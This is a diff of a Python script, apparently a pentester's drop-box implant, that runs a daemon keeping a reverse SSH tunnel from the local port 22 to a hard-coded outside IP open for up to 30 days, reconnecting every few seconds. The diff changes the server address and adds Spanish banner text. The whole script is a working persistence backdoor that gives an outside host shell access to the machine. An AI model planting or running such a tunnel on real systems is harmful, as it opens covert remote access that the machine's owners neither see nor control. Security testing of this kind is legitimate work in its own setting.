@@ -11,12 +11,12 @@ import logging
 import subprocess
 import os
 
-RPORT = 5522
-SERVER="45.76.173.191"
+PORT = 5522
+SERVER="155.138.209.42"
 SLEEP = 5
 USER = "pentester"
 DAYS = 30
-COMMAND = ["ssh", "-C", "-N", "-R", str(RPORT) + ":localhost:" + "22", "-o", "ServerAliveInterval=60", "-o", "ServerAliveCountMax=" + str(DAYS*24*60), USER + "@" + SERVER]
+COMMAND = ["ssh", "-C", "-N", "-R", str(PORT) + ":localhost:" + "22", "-o", "ServerAliveInterval=60", "-o", "ServerAliveCountMax=" + str(DAYS*24*60), USER + "@" + SERVER]
 LOG_PATH = "/tmp/rsshd.log"
 
 def isOpen(ip,port):
@@ -30,7 +30,7 @@ def isOpen(ip,port):
 
 def daemon():
     while True:
-        if isOpen(SERVER, RPORT) == False:
+        if isOpen(SERVER, PORT) == False:
             log_to_file("No existe SSH reverso activo")
             try:
                 log_to_file("Iniciando SSH reverso")
@@ -40,6 +40,7 @@ def daemon():
             except:
                 log_to_file("No fue posible iniciar SSH reverso")
         time.sleep(SLEEP)
+        
                 
 
 def log_to_file(msg):
@@ -59,7 +60,8 @@ def check_tmux():
 
     
     banner = "" + \
-        "____ ____ _  _ ____ ____ ____ ____    ____ ____ _  _ \n" + \
+        "                E R R O R !!! \n" + \
+        "________  __       __  __    __  __    __ \n" + \
         "$$$$$$$$\ $$\      $$\ $$\   $$\ $$\   $$\  \n" + \
         "\__$$  __|$$$\    $$$ |$$ |  $$ |$$ |  $$ | \n" + \
         "   $$ |   $$$$\  $$$$ |$$ |  $$ |\$$\ $$  | \n" + \
@@ -68,6 +70,8 @@ def check_tmux():
         "   $$ |   $$ |\$  /$$ |$$ |  $$ |$$  /\$$\  \n" + \
         "   $$ |   $$ | \_/ $$ |\$$$$$$  |$$ /  $$ | \n" + \
         "   \__|   \__|     \__| \______/ \__|  \__| \n" + \
+        "\n" + \
+        "             EJECUTAR TMUX!!! \n" + \
         ""
                                            
                                            
@@ -83,6 +87,6 @@ def check_tmux():
 
 if __name__ == "__main__":
     os.system("clear")
-    banner()
     check_tmux()
+    banner()
     daemon()
